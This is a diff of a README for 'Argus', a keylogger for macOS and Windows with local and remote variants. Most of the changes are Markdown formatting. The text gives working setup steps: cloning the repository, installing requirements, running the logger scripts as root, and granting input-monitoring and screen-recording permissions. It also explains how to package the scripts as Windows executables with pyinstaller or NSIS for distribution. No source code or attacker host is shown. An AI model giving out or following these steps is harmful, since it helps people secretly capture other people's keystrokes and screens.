@@ -29,34 +29,34 @@ Keylogger With multiple Features Built For  **macOS and Windows**
 **git clone https://github.com/ALDON94/argus.git**
 
 
-*cd Argus/Windows/bin/Local* **or** *cd Argus/Windows/bin/Remote*
+**cd Argus/Windows/bin/Local**   *or*  **cd Argus/Windows/bin/Remote**
 
 
 *pip3 install -r requirements.txt*
 
 
-####run
+###### run
 
-*python3 win-local.py* **or** *python3 win-remote.py* 
+**python3 win-local.py**    *or*   **python3 win-remote.py** 
 
 
 
-**if you want to convert the script to .EXE There's two ways you can go for it**
+### if you want to convert the script to .EXE format There's two ways you can go for it
 
 
 # First option using pyinstaller 
 
-*pip3 install pyinstaller*
+**pip3 install pyinstaller**
 
-*pyinstaller --onefile [filename]* **this gonna take a while be patient**
+**pyinstaller --onefile [filename]* **this gonna take a while be patient**
 
-*when it's done it will crate a bunch of folders browse the folder [dist] an you should see .EXE file format based on the script*
+**when it's done it will crate a bunch of folders browse the folder [dist] an you should see .EXE file format based on the script**
 
 
 # Second option using NSIS App
 
 
-*Simply Download The NSIS App From the Official Website and install it*
+**Simply Download The NSIS App From the Official Website and install it**
 
 
 **run the NSIS App As Administrator**
@@ -65,9 +65,11 @@ Keylogger With multiple Features Built For  **macOS and Windows**
 **click install based on ZIP file**
 
 
-*compress the script you want to convert and open or drag it into the NSIS App*
+**compress the script you want to convert and open or drag it into the NSIS App**
 
-*click generate and this will create .EXE file format based on the script*
+
+**click generate and this will create .EXE file format based on the script**
+
 
 
 # Installation on macOS
@@ -76,13 +78,10 @@ Keylogger With multiple Features Built For  **macOS and Windows**
 **git clone https://github.com/ALDON94/argus.git**
 
 
-*cd Argus/macos/bin/Local* **or** *cd Argus/macos/bin/Remote*
+**cd Argus/macos/bin/Local**  or  **cd Argus/macos/bin/Remote**
 
 
-*pip3 install -r requirements.txt*
-
-
-sudo python3 osx-local.py **run it as root!**
+**pip3 install -r requirements.txt**
 
 
 **enable input monitoring for whatever app you are runing the script from**
@@ -93,6 +92,8 @@ sudo python3 osx-local.py **run it as root!**
 
 **Do The Same Step For Screen Recording**
 
+
+**sudo python3 osx-local.py**  *or*   **sudo python3 osx-remote.py**  **run it as root!**
 
 
 ## Example
